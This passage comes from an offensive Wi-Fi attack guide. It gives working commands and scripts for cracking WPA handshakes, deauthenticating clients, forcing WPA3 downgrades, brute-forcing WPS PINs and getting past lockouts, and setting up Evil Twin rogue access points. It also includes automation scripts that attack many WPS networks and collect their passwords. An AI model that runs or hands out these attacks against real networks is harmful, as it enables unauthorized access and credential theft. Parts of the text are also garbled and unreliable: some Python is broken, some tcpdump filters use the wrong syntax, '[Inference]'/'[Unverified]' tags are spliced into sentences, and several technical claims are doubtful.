# Creates wpa_handshake.hccapx (Hashcat format)

# Convert to John format if needed
cap2hccapx.bin wpa_capture-01.cap wpa_handshake.hccapx
```

Handshake components captured:

- Message 1 (M1): Nonce from AP
- Message 2 (M2): Nonce from client, MIC hash
- Message 3 (M3): Encrypted key material
- Message 4 (M4): Client confirmation MIC

[Inference] All four messages enable offline WPA password cracking by verifying dictionary candidates against captured MIC hashes, requiring only one complete handshake for dictionary attack execution.

**Dictionary Attack Against WPA Handshake**

Crack WPA PSK through password dictionary brute-force:

```bash
# Using aircrack-ng
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap
# -w: Wordlist file
# -b: Network BSSID (optional for single network captures)

# Using hashcat
hashcat -m 22000 wpa_handshake.hccapx wordlist.txt
# -m 22000: WPA2-PSK format

# Using john the ripper
john --format=wpapsk --wordlist=wordlist.txt wpa_handshake.hccapx

# GPU acceleration (Hashcat)
hashcat -m 22000 wpa_handshake.hccapx wordlist.txt -d 1 --workload-profile 4
```

Dictionary attack process:

1. For each candidate password: Calculate PMK (PBKDF2-SHA1)
2. Calculate PTK (derived from PMK)
3. Calculate MIC (HMAC-MD5 or HMAC-SHA1)
4. Compare against captured MIC
5. If match found, password recovered

[Inference] WPA dictionary attacks succeed when administrator-configured passwords exist in wordlist or derive from predictable patterns, with success rates varying 5-95% depending on wordlist comprehensiveness and password strength.

**Optimized Dictionary Attack Techniques**

Improve cracking efficiency through optimization:

```bash
# Mask attack (Hashcat)
# Attack passwords matching specific pattern
hashcat -m 22000 wpa_handshake.hccapx -a 3 "Password?d?d?d?d"
# ?d = digit, ?u = uppercase, ?l = lowercase

# Rule-based attack
# Apply transformation rules to dictionary words
hashcat -m 22000 wpa_handshake.hccapx wordlist.txt -r rules.txt

# Rules example (capitalize, append digit)
c $1 $2 $3 $4
# Capitalizes first letter, appends digits 1234

# Hybrid attack (combine wordlist + mask)
hashcat -m 22000 wpa_handshake.hccapx wordlist.txt -a 6 "?d?d?d?d"
# Tests wordlist + 4-digit suffix combinations

# Distributed cracking (multiple systems)
# Split wordlist across systems
split -l 1000000 wordlist.txt wordlist_part_
# Process on multiple machines
hashcat -m 22000 wpa_handshake.hccapx wordlist_part_aa --restore
```

[Inference] Advanced cracking techniques reduce computation requirements from full keyspace (2^128 combinations) to targeted subsets, accelerating cracking speed 10-100x depending on optimization method and target password characteristics.

**Rainbow Table Attacks Against WPA**

Pre-computed hash tables for rapid WPA cracking:

```bash
# Generate rainbow tables for common SSIDs
genpmk -f wordlist.txt -d rainbowtable_ssid -s "TargetSSID"
# Generates pre-computed PMK values for all wordlist entries

# Use rainbow tables for cracking
cowpatty -d rainbowtable_ssid -s "TargetSSID" -r wpa_capture.cap

# Online rainbow table lookup
# Services like WirelessKey.com provide SSID-specific tables
# Download relevant table and perform lookup

# Verify table usefulness
coWPAtty -c -d rainbowtable_ssid
# Lists SSID coverage in rainbow table database
```

[Unverified] Pre-computed rainbow tables enable [Inference] single-pass WPA cracking in seconds-minutes when SSID-specific tables are available, though generation requires significant storage (50GB+ for comprehensive tables) and only benefits password sets already in tables.

**WPA Cracking with Wordlist Optimization**

Optimize wordlists for target environment:

```bash
# Generate environment-specific wordlist
# User organization: Acme Corp
# Likely passwords: Acme2024!, AcmeCorp, etc.

# Using crunch for pattern generation
crunch 8 16 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()" -o wordlist_large.txt

# Leverage historical breaches
# Download breach databases (rockyou.txt, etc.)
curl -L https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt -o rockyou.txt

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt wordlist3.txt > combined.txt
sort -u combined.txt > combined_unique.txt

# Prioritize by frequency (most common passwords first)
sort combined.txt | uniq -c | sort -rn | awk '{print $2}' > priority_wordlist.txt
```

[Inference] Target-specific wordlists increase cracking success probability by focusing on passwords likely within organizational environment or common patterns relevant to target context.

**WPA TKIP Vulnerability Exploitation**

Exploit TKIP weaknesses for accelerated cracking:

```bash
# TKIP networks identifiable by CIPHER field
airodump-ng wlan0 | grep TKIP

# TKIP uses RC4 with per-packet key derivation
# Vulnerability: Phase 2 key scheduling weaknesses enable key recovery

# Aircrack-ng optimization for TKIP
aircrack-ng -f 3 wpa_tkip_capture.cap
# -f 3: Use advanced TKIP-specific attacks

# Packet collection acceleration
# TKIP requires fewer unique IVs than modern WPA2/CCMP
# Dictionary attacks still applicable but less reliable
```

[Unverified] TKIP vulnerabilities enable [Inference] cryptographic attacks beyond dictionary brute-force when sufficient keyed packets are collected, though most practical attacks remain dictionary-based as cryptographic recovery is computationally intensive.

**WPA/WPA2 Enterprise (802.1X) Attacks**

Target enterprise WPA with alternative vectors:

```bash
# Enterprise WPA uses RADIUS authentication
# Not vulnerable to PSK dictionary attacks
# Alternatives:

# 1. Client certificate capture
# Intercept RADIUS authentication traffic (unencrypted initially)
tcpdump -i wlan0 -w radius_capture.pcap "port 1812 or port 1813"

# 2. Evil AP impersonation (covered in Evil Twin section)
# Clients may connect to rogue RADIUS requesting credentials

# 3. Dictionary attack on captured EAP-MD5
# Some implementations use weak EAP methods
aircrack-ng wpa_enterprise.cap -w wordlist.txt
# Limited success compared to PSK attacks

# 4. RADIUS server compromise
# Direct compromise of authentication backend
```

[Inference] Enterprise WPA exploits typically require network positioning (MITM) or infrastructure compromise rather than captured traffic analysis, making dictionary attacks ineffective compared to PSK cracking.

**WPA3 Backward Compatibility Attacks**

Exploit WPA3 networks falling back to WPA2:

```bash
# Identify WPA3 networks
airodump-ng wlan0 | grep WPA3

# Some implementations support WPA2/WPA3 mixed mode
# Clients may downgrade to WPA2 if WPA3 unavailable

# KRACK attack (Key Reinstallation Attack)
# Against WPA2/WPA3 implementations with vulnerable key reinstallation

# Deauthenticate clients
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0

# Capture re-authentication using downgrade
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa2_downgrade wlan0

# Proceed with WPA2 dictionary attack
aircrack-ng wpa2_downgrade-01.cap -w wordlist.txt
```

[Unverified] WPA3 downgrade attacks require [Inference] specific network configurations supporting backward compatibility, with most modern deployments enforcing WPA3-only mode preventing downgrade exploitation.

**WPA Cracking Automation and Orchestration**

Automate WPA cracking workflows:

```bash
#!/bin/bash
# Automated WPA cracking pipeline

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL=11
WORDLIST="wordlist.txt"
OUTPUT_DIR="./wpa_cracks"

mkdir -p $OUTPUT_DIR

# 1. Capture handshake
echo "[*] Capturing handshake..."
airodump-ng -c $CHANNEL --bssid $TARGET_BSSID -w $OUTPUT_DIR/capture wlan0 &
CAPTURE_PID=$!

# Wait for handshake or timeout after 5 minutes
for i in {1..300}; do
    if grep -q "WPA Handshake" $OUTPUT_DIR/capture-01.csv 2>/dev/null; then
        echo "[+] Handshake captured!"
        kill $CAPTURE_PID
        break
    fi
    sleep 1
done

# 2. Deauthenticate to force handshake
aireplay-ng -0 10 -a $TARGET_BSSID wlan0

# 3. Wait for re-authentication
sleep 10

# 4. Perform dictionary attack
echo "[*] Attempting dictionary attack..."
hashcat -m 22000 $OUTPUT_DIR/capture.hccapx $WORDLIST -o $OUTPUT_DIR/results.txt

# 5. Check results
if [ -f $OUTPUT_DIR/results.txt ]; then
    echo "[+] Password cracked!"
    cat $OUTPUT_DIR/results.txt
else
    echo "[-] Dictionary attack failed"
fi
```

[Inference] Automated workflows accelerate WPA cracking campaigns by eliminating manual steps and enabling parallel processing across wordlists or multiple networks simultaneously.

---

## WPA3 Attacks

WPA3 attacks exploit protocol vulnerabilities, side-channel weaknesses, or configuration misimplementations in the newest WiFi security standard, including Dragonblood vulnerability and downgrade attacks.

**WPA3 Protocol Overview and Identification**

Identify and analyze WPA3-protected networks:

```bash
# Network detection with WPA3
airodump-ng wlan0 | grep -i wpa3
# ENC column displays "WPA3" or "WPA2/WPA3"

# Targeted WPA3 network monitoring
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa3_capture wlan0

# Detailed analysis with extended display
airodump-ng wlan0 -C a  # Analyze 5GHz band (WPA3 common)

# Protocol version verification via pcap analysis
tcpdump -r wpa3_capture.cap -nn "wlan.fc.type == 0 and wlan.fc.subtype == 0" | head -20
```

WPA3 identifiers:

- **RSN IE (Robust Security Network)**: Contains WPA3 authentication suites
- **SAE (Simultaneous Authentication of Equals)**: WPA3 key exchange mechanism
- **OWE (Opportunistic Wireless Encryption)**: WPA3 open network variant

[Inference] WPA3 identification requires deep packet inspection of management frames to detect presence, as ENC display may combine WPA2/WPA3 when mixed-mode networks are configured.

**Dragonblood Vulnerability (CVE-2019-9494, CVE-2019-9496)**

Exploit side-channel vulnerabilities in WPA3 SAE implementation:

```bash
# Dragonblood vulnerabilities affect SAE implementations
# Two main variants:

# 1. Timing side-channel (affects password-based SAE)
# Attack: Measure password verification timing differences
# Vulnerable: Implementations with non-constant-time comparisons

# 2. Cache-based side-channel (affects password derivation)
# Attack: Exploit CPU cache timing for password byte recovery
# Vulnerable: Systems with inadequate constant-time implementation

# Practical exploitation requires:
# - Proximity to target network (side-channel measurement)
# - Multiple authentication attempts (statistical analysis)
# - Detailed timing measurements (microsecond precision)

# Timing attack framework (conceptual)
python3 << 'EOF'
import time
from scapy.all import *

target_bssid = "AA:BB:CC:DD:EE:FF"
channel = 6

for password_candidate in password_list:
    # Measure authentication attempt timing
    start_time = time.time_ns()
    
    # Send SAE authentication frame
    # (Conceptual - actual SAE frame construction complex)
    
    timing = time.time_ns() - start_time
    
    # Analyze timing variations
    # Correct password bytes produce detectable timing patterns
    if timing > threshold:
        print(f"Timing anomaly for: {password_candidate}")
EOF
```

[Unverified] Dragonblood timing attacks are [Inference] theoretically exploitable under optimal conditions with precise measurement equipment, though [Unverified] practical exploitation difficulty remains high due to noise, network latency, and implementation variations.

**KRACK Attack (Key Reinstallation Attack) on WPA3**

Exploit key reinstallation vulnerabilities in WPA3 implementations:

```bash
# KRACK exploits four-way handshake vulnerabilities
# Affects WPA2 primarily, some WPA3 implementations vulnerable

# Attack mechanism:
# 1. Deauthenticate client from AP
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0

# 2. Create position for MITM between client and AP
# Attacker becomes transparent relay

# 3. Block or delay fourth message of four-way handshake
# Forces client key reinstallation

# 4. Inject packets with reinstalled keys
# Exploit nonce counter reset or IV reuse

# Practical KRACK exploitation requires:
# - Precise packet timing and manipulation
# - Ability to intercept and modify frames
# - Understanding of target device cryptography implementation

# Detection of KRACK vulnerability
# Monitor for unexpected key reinstallation events
tcpdump -i wlan0 -w krack_analysis.pcap "wlan.frame_control.type == 0"

# Analyze for duplicate message detection
tshark -r krack_analysis.pcap -Y "wlan.fixed.timestamp" | sort | uniq -d
```

[Unverified] KRACK attacks on WPA3 are [Inference] largely mitigated by modern implementations due to widespread patching, though [Unverified] some devices remain vulnerable if firmware updates are not applied.

**WPA3 Downgrade Attacks**

Force WPA3 networks to downgrade to WPA2 for established attacks:

```bash
# Identify mixed-mode WPA3/WPA2 networks
airodump-ng wlan0 | grep "WPA2/WPA3"

# WPA3 personal typically uses SAE; WPA2 uses PSK
# Some implementations permit downgrade on client request

# Deauthenticate clients repeatedly
for i in {1..20}; do
    aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0
    sleep 2
done

# Monitor for downgrade events
# Client may fallback to WPA2 after failed WPA3 attempts
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w downgrade_capture wlan0

# Upon successful downgrade, capture four-way handshake
# Proceed with WPA2 dictionary attack
aircrack-ng downgrade_capture-01.cap -w wordlist.txt
```

[Inference] WPA3 downgrade attacks succeed when networks support dual-mode authentication and clients prioritize connectivity over security, though modern WPA3 implementations disable WPA2 fallback by default.

**SAE (Simultaneous Authentication of Equals) Dictionary Attack**

Target WPA3 SAE implementation weaknesses:

```bash
# SAE replaces PSK pre-shared key mechanism
# Conceptual attacks on SAE:

# 1. Captured SAE frames contain authentication material
# Unlike PSK (no four-way handshake), SAE exchanges visible

# 2. SAE commit/confirm frame capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0

# Monitor for SAE authentication attempts
# SAE frames identifiable by specific IE fields

# 3. Offline SAE recovery (if vulnerability exists)
# SAE dictionary attacks not standard due to protocol design
# Protocol designed to resist offline password cracking

python3 << 'EOF'
# SAE recovery conceptual framework
# Standard attacks on SAE not feasible with current implementations
# Would require:
# - Cryptographic weakness in SAE algorithm (unknown as of knowledge cutoff)
# - Side-channel exploitation (Dragonblood type)
# - Protocol flaw enabling brute-force
EOF
```

[Unverified] SAE design specifically addresses WPA2 PSK weaknesses, providing [Inference] resistance against offline dictionary attacks that dominated WPA2 cracking, making standard SAE password cracking infeasible with current attack methods.

**WPA3 Opportunistic Wireless Encryption (OWE) Attacks**

Exploit OWE open network variant:

```bash
# OWE provides encryption without authentication
# Intended for open networks (hotels, cafes)

# Identify OWE networks
airodump-ng wlan0 | grep -i "OWE"

# OWE handshake capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w owe_capture wlan0

# OWE uses Diffie-Hellman key exchange
# No pre-shared secret involved

# Attack vectors:

# 1. MITM attack (network positioning required)
# Attacker intercepts DH exchange

# 2. Known cryptographic weaknesses in DH implementation
# Requires specific vulnerable group selection

# 3. Side-channel attacks on DH computation
tcpdump -i wlan0 -w owe_analysis.pcap "wlan.type == 0 and wlan.subtype == 8"

# Analyze timing of DH computations
# Statistical patterns may leak information

# 4. Downgrade to unencrypted if supported
# Some implementations permit disabling encryption
```

[Inference] OWE attacks remain limited compared to PSK attacks due to lack of password basisâ€”exploitation typically requires MITM positioning or cryptographic implementation flaws rather than password recovery.

**WPA3 Brute-Force Resistance Analysis**

Analyze WPA3 anti-brute-force mechanisms:

```bash
# WPA3 implements SAE anti-brute-force through backoff
# Failed authentications trigger increasing backoff timers

# Measure anti-brute-force behavior
import time

for attempt in range(1, for attempt in range(1, 100): start = time.time()

# Attempt authentication with wrong password
# (Conceptual - actual implementation varies)

backoff_delay = time.time() - start

# Delay increases exponentially
# After N failed attempts: delay = 2^attempt * base_delay

print(f"Attempt {attempt}: {backoff_delay}s backoff")

if backoff_delay > 3600:  # Over 1 hour
    print("Brute-force protection activated - further attempts blocked")
    break

time.sleep(backoff_delay)
````

[Inference] WPA3 SAE anti-brute-force mechanisms make password guessing impractical by exponentially increasing delays between authentication attempts, preventing rapid dictionary attack exploitation compared to WPA2 lack of rate limiting.

**WPA3 Configuration and Implementation Flaws**

Exploit misconfigured WPA3 deployments:

```bash
# Network surveying for configuration weaknesses
airodump-ng -C a wlan0 > network_survey.txt

# Common WPA3 misconfigurations:

# 1. WPA3-only with weak password
# SAE protection bypassed by dictionary attacks through protocol analysis

# 2. Mixed WPA2/WPA3 mode with WPA2 downgrade allowed
# Clients unable to establish WPA3 connection fallback to WPA2

# 3. WPA3 Personal with client isolation disabled
# Enables inter-client attacks

# 4. Default or manufacturer credentials
# Some enterprise WPA3 implementations ship with defaults

# Identify and target misconfigurations
for ssid in $(cat ssid_list.txt); do
    # Test for WPA2 downgrade
    aireplay-ng -0 10 -a $BSSID wlan0
    
    # Monitor for authentication attempt
    # Capture any fallback to WPA2
    airodump-ng -c 6 --bssid $BSSID -w downgrade_test wlan0
done
````

[Inference] WPA3 security improvements become ineffective when configurations permit backward compatibility or weak password selection, requiring security enforcement through policy rather than protocol alone.

**WPA3 Transition Mode Attacks**

Target networks supporting both WPA3 and older standards:

```bash
# Identify transition/mixed mode networks
airodump-ng wlan0 | grep -E "WPA3.*WPA2|WPA2.*WPA3"

# Transition mode enables gradual client migration
# Creates temporary vulnerability window

# Attack procedure:

# 1. Enumerate clients attempting WPA3 connection
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w client_monitor wlan0

# 2. Deauthenticate WPA3-capable client
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0

# 3. Create rogue WPA2 SSID matching legitimate network
# (Evil Twin - see section below)
hostapd -dd rogue_wpa2.conf

# 4. Client connects to rogue WPA2 AP
# Capture four-way handshake

# 5. Dictionary attack on captured handshake
aircrack-ng rogue_capture-01.cap -w wordlist.txt
```

[Inference] WPA3 transition mode vulnerabilities emerge from coexistence requirements, enabling attackers to isolate clients to less-secure WPA2 through deauthentication followed by rogue AP presentation.

**WPA3 Enterprise (802.1X-Enterprise) Attacks**

Target WPA3-Enterprise deployments:

```bash
# Enterprise WPA3 uses 802.1X with EAP authentication
# More complex than PSK, but additional vectors exist

# 1. Rogue RADIUS server creation
# Set up fake radius server at attacker-controlled AP

hostapd -dd enterprise_rogue.conf

# enterprise_rogue.conf excerpt:
# interface=wlan0
# ssid=CorporateWiFi
# wpa=3
# wpa_key_mgmt=WPA-EAP
# ieee8021x=1
# eap_server=1
# eap_user_file=/etc/hostapd/eap_users

# 2. EAP method downgrade
# Force clients to use weaker EAP variants (EAP-MD5, LEAP)

# 3. Certificate capture and analysis
# Enterprise WPA3 may use server certificate
# MITM positioning enables certificate interception

tcpdump -i wlan0 -w enterprise_capture.pcap "port 1812 or port 1813 or port 443"

# 4. Credential harvesting through fake login
# Rogue RADIUS may capture credentials before rejection

# 5. RADIUS server compromise (backend attack)
# Direct infrastructure compromise outside WiFi scope
```

[Unverified] WPA3-Enterprise attacks typically require [Inference] network positioning and infrastructure targeting rather than pure WiFi protocol exploitation, making practical attacks more complex than consumer WPA3-Personal.

---

## WPS PIN Attacks

WPS (WiFi Protected Setup) PIN attacks exploit weak default PIN implementations and brute-force mechanisms, enabling rapid AP compromise without password knowledge through 8-digit PIN recovery.

**WPS Detection and Enumeration**

Identify WPS-enabled access points:

```bash
# WPS detection via passive scanning
airodump-ng wlan0 | grep -i "WPS"

# Detailed WPS identification
airodump-ng -w wps_scan wlan0

# WPS Information from beacons/probe responses
tcpdump -i wlan0 -nn "wlan.type == 0 and wlan.subtype == 8" -w beacons.pcap

# Analyze captured beacons for WPS IE
tshark -r beacons.pcap -Y "wps" -V | grep -E "WPS|PIN|Version|State"

# Specific WPS enumeration tools
wash -i wlan0
wash -i wlan0 -2  # 2.4GHz only
wash -i wlan0 -5  # 5GHz only
```

WPS indicators in beacon analysis:

- **WPS IE present**: Access point supports WPS
- **PIN locked**: AP has locked WPS after failed attempts
- **Version**: WPS protocol version (1.0, 2.0)
- **State**: Not Configured, Configured

[Inference] WPS identification through beacon analysis reveals AP capabilities and configuration state, enabling targeted attacks against vulnerable implementations.

**WPS PIN Brute-Force Attack**

Systematically attempt all possible WPS PIN combinations:

```bash
# Using Reaver - dedicated WPS attack tool
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv
# -i: Monitor mode interface
# -b: Target AP BSSID
# -vv: Verbose output

# Accelerated brute-force
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF --no-nacks -N -d 0 -T 1 -c 1 -vv
# --no-nacks: Ignore nack responses
# -N: Never deauthenticate
# -d 0: Delay between attempts (0ms)
# -T 1: Timeout for associate (1 second)
# -c 1: Channel (1-13)

# Output displays PIN recovery progress
# [+] PIN recovered: 12345670
# [+] WPA PSK: 'NetworkPassword'
```

WPS PIN structure:

```
PIN format: XXXXXXXX (8 digits)
First 7 digits: Random or derived
8th digit: Checksum (sum of first 7 mod 10)
Space: 10,000,000 possible PINs (7 digits) â†’ ~10 million attempts
```

[Inference] WPS PIN brute-force requires average 5 million attempts (half the space), achievable in hours-days depending on AP processing speed and network interference.

**WPS PIN Cracking Process Analysis**

Understand WPS authentication process exploitation:

```bash
# WPS exchange sequence:

# 1. Probe request with WPS IE
# AP responds with WPS capability

# 2. M1-M8 messages (registration protocol)
# Client and AP exchange device information and nonce

# 3. PIN validation
# AP verifies submitted PIN via hash comparison

# 4. Key delivery (if PIN correct)
# AP transmits WPA2 credentials (SSID, password)

# Brute-force optimization:

# - WPS typically validates PIN in two halves
#   First 4 digits tested, then second 4 digits
#   Reduces complexity to ~11,000 attempts max

# Reaver utilizes this by:
# 1. Brute-forcing first half: 0000-9999 (~10,000 attempts)
# 2. Upon success, brute-force second half: 0000-9999
# 3. Calculate 8th digit (checksum)

# Time optimization:
# Average 5-6 hours for complete PIN recovery
# With optimizations: 2-4 hours
# Newer AP implementations: 24+ hours (enforced delays)
```

[Inference] Two-stage WPS PIN validation reduces brute-force complexity from 10 million to ~20,000 attempts, enabling practical attacks against WPS implementations.

**WPS Pixie Dust Attack**

Exploit WPS entropy weaknesses for rapid PIN recovery:

```bash
# Pixie Dust attack targets weak random number generation
# in WPS implementation

# Using Pixiewps tool
pixiewps --help
pixiewps -e <encrypted_settings> -s <serial> -z <mac> -n <nonce> --verbose

# Pixiewps requires:
# - Encrypted WPS settings (from M7 message)
# - AP serial number
# - AP MAC address
# - Nonce value (from WPS exchange)

# Reaver with Pixiewps integration
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -K
# -K: Enable Pixiewps integration

# Pixiewps analysis process:
# 1. Identifies weak RNG patterns
# 2. Predicts likely PIN values
# 3. Tests predictions against AP

# Output if vulnerable:
# [*] Pixiewps found likely PIN: 12345670
# [+] Time: <5 minutes

# Common vulnerable APs:
# - Older Linksys models
# - Some TP-Link implementations
# - First-generation consumer routers
```

[Inference] Pixie Dust attacks reduce recovery time from hours to minutes when AP implements weak random number generation, though modern implementations use cryptographically-secure RNG preventing this attack.

**WPS Timeout and Rate-Limiting Bypass**

Overcome AP protections against brute-force attacks:

```bash
# Modern APs implement rate limiting:

# 1. Exponential backoff: Delays increase after failed attempts
# 2. PIN lockout: Disable WPS after N failed attempts
# 3. Association timeout: Force re-association between attempts

# Bypass techniques:

# Delay manipulation
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -d <delay> --timeout <timeout>
# Adjust delays to match AP's minimum required interval

# Rate limiting bypass
# Space attempts across multiple sessions
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF --no-nacks -N
# --no-nacks: Don't interpret timeouts as failures

# Association reset
# Re-associate between attempts to reset timeout counters
for pin in {00000000..99999999}; do
    aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
    # Fake authentication
    reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -p "$pin" --no-associate
    sleep 1
done

# Alternate MAC spoofing
# Use different MAC addresses across attempts
macchanger -r wlan0
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF ...
```

[Unverified] Rate limiting bypass effectiveness depends on [Inference] specific AP implementation and protectionsâ€”some implementations enforce hardware-level delays preventing bypass, while others rely on software delays circumventable through manipulation.

**WPS PIN Lock Recovery**

Bypass WPS PIN lockout protection:

```bash
# After failed attempts, APs lock WPS functionality
# Lock duration: typically 1-24 hours

# Bypass techniques:

# 1. Wait for automatic unlock
# Passive bypass - not practical for time-sensitive scenarios

# 2. Factory reset
# Physical reset button or recovery mechanism
# Resets lockout but loses configuration

# 3. AP reboot exploitation
# Reboot may clear lockout counter
aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0
# Deauthenticate all clients
# Power cycle may follow from client perspective

# Monitor for AP reboot
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w reboot_monitor wlan0
# Look for beacon interval reset or timing changes

# Resume attack after reboot
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv

# 4. Bypass via client-side attacks
# Some APs unlock WPS for specific client MACs
# Spoof authorized MAC addresses if discoverable
```

[Inference] WPS PIN lock protections significantly slow brute-force attacks but don't prevent them entirelyâ€”combination of multiple evasion techniques enables eventual PIN recovery with patience.

**WPS Default PIN Recovery**

Target APs using manufacturer default PINs:

```bash
# Many APs ship with default or predictable PINs

# Common default PINs by manufacturer:
# Linksys: 12345670
# TP-Link: 12345670
# ASUS: 12345670
# Netgear: Typically random, occasionally 12345670

# Create wordlist of common PINs
cat > default_pins.txt << 'EOF'
12345670
00000000
11111111
88888888
99999999
EOF

# Test common PINs before brute-force
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -p 12345670 -N
# -p: Specify PIN

# If success:
# [+] WPA PSK: 'Password'
# Credentials compromised

# Combined approach: Default â†’ Pixiewps â†’ Brute-force
# 1. Test manufacturer defaults (seconds)
# 2. Attempt Pixie Dust (5-30 minutes)
# 3. Full brute-force if previous fail (hours-days)
```

[Inference] Default PIN attacks provide fastest initial access vector, with manufacturer defaults enabling AP compromise in seconds when not changed during initial setup.

**WPS Credential Extraction**

Parse and utilize recovered WPA2 credentials:

```bash
# Reaver outputs recovered credentials:
# [+] WPA PSK: 'NetworkPassword'
# [+] AP PIN: '12345670'

# Extract from Reaver logs
grep "WPA PSK" /usr/local/etc/reaver/reaver.log

# WPS delivers encrypted credentials in M7 message
# Reaver automatically decrypts upon PIN success

# Verify credentials
# Connect using recovered password
nmcli device wifi connect "TargetSSID" password "NetworkPassword"

# Alternative connection verification
wpa_supplicant -i wlan0 -c wpa_config.conf -d

# wpa_config.conf:
# network={
#     ssid="TargetSSID"
#     psk="NetworkPassword"
#     key_mgmt=WPA-PSK
# }
```

[Inference] Successfully recovered credentials enable full network access, with WPS design inherently providing plaintext password delivery upon PIN authentication rather than requiring independent cracking.

**WPS Attack Automation and Orchestration**

Automate WPS attacks across multiple networks:

```bash
#!/bin/bash
# Automated WPS attack framework

TARGET_INTERFACE="wlan0"
OUTPUT_DIR="./wps_results"
BSSID_LIST="networks.txt"

mkdir -p $OUTPUT_DIR

# 1. Scan for WPS networks
echo "[*] Scanning for WPS networks..."
wash -i $TARGET_INTERFACE -o $OUTPUT_DIR/wps_networks.txt

# 2. Process each WPS network
while read bssid essid channel wps_state; do
    echo "[*] Attacking: $essid ($bssid)"
    
    # 3. Attempt Pixiewps first
    reaver -i $TARGET_INTERFACE -b $bssid -K -vv | tee $OUTPUT_DIR/${bssid}_pixiewps.log &
    PID=$!
    
    # Timeout after 10 minutes (or until success)
    sleep 600
    kill $PID 2>/dev/null
    
    # Check for success
    if grep -q "WPA PSK" $OUTPUT_DIR/${bssid}_pixiewps.log; then
        echo "[+] Credentials recovered!"
        grep "WPA PSK" $OUTPUT_DIR/${bssid}_pixiewps.log >> $OUTPUT_DIR/credentials.txt
        continue
    fi
    
    # 4. Fall back to full brute-force
    echo "[*] Starting PIN brute-force..."
    reaver -i $TARGET_INTERFACE -b $bssid -N --no-nacks -d 0 -T 1 -vv | tee $OUTPUT_DIR/${bssid}_bruteforce.log &
    PID=$!
    
    # Monitor progress
    while kill -0 $PID 2>/dev/null; do
        if grep -q "WPA PSK" $OUTPUT_DIR/${bssid}_bruteforce.log; then
            echo "[+] PIN cracked!"
            grep -E "PIN|WPA PSK" $OUTPUT_DIR/${bssid}_bruteforce.log >> $OUTPUT_DIR/credentials.txt
            break
        fi
        sleep 60
    done
    
done < $OUTPUT_DIR/wps_networks.txt

echo "[*] Attack complete. Results in $OUTPUT_DIR/credentials.txt"
```

[Inference] Automated WPS attacks enable large-scale wireless network compromise, with multiple networks attacked in parallel during extended operations.

---

## Evil Twin Attacks

Evil Twin attacks establish rogue access points mimicking legitimate networks, enabling MITM positioning, credential harvesting, malware distribution, and network segmentation bypass through client association to attacker-controlled infrastructure.

**Rogue Access Point Creation**

Establish fake network infrastructure:

```bash
# Configure AP interface
airmon-ng start wlan0
# Creates wlan0mon

# Create hostapd configuration
cat > evil_twin.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# No WPA (Open network)
# For WPA2: add authentication parameters
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF

# Launch rogue AP
hostapd -dd evil_twin.conf

# Alternative using create_ap wrapper
create_ap wlan0mon eth0 FreeWiFi password123
# wlan0mon: WiFi interface
# eth0: Upstream internet (or use --no-internet)
# SSID: Network name
# Password: WPA2 password
```

**SSID Cloning and Beacon Spoofing**

Clone legitimate networks to fool clients:

```bash
# Identify target network
airodump-ng wlan0 -w target_scan

# Extract SSID, BSSID, channel
cat > evil_twin_clone.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=LegitimateNetwork     # Clone victim SSID
channel=6                   # Match victim channel
hw_mode=g
bssid=AA:BB:CC:DD:EE:01     # Slightly different MAC
wmm_enabled=0

# Match encryption of victim
wpa=2
wpa_passphrase=commonpassword
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
EOF

hostapd -dd evil_twin_clone.conf

# Clients confused by two identical SSIDs on same channel
# Client behavior depends on signal strength and BSSID preference

# Monitor client association
tcpdump -i wlan0mon -nn "wlan.fc.subtype == 0" | grep -i "auth\|assoc"

# Track associations to rogue AP
iw dev wlan0mon station dump
# Displays connected clients and signal strength
```

[Inference] SSID cloning creates ambiguity for clients attempting to reconnect to preferred networks, with association success depending on relative signal strength and client supplicant behavior.

**Client Deauthentication and Association**

Force clients to connect to rogue AP:

```bash
# Identify target clients
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w client_scan wlan0

# Deauthenticate from legitimate AP
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0
# Forces client re-association to any available AP

# Launch rogue AP simultaneously
# Stronger signal = higher association probability
# Geolocation near client = higher success rate

# Monitor rogue AP for client connections
hostapd_cli -i wlan0mon status

# Track associated clients
iw dev wlan0mon station dump | grep -E "Station|signal"

# Output shows connected clients on rogue AP
```

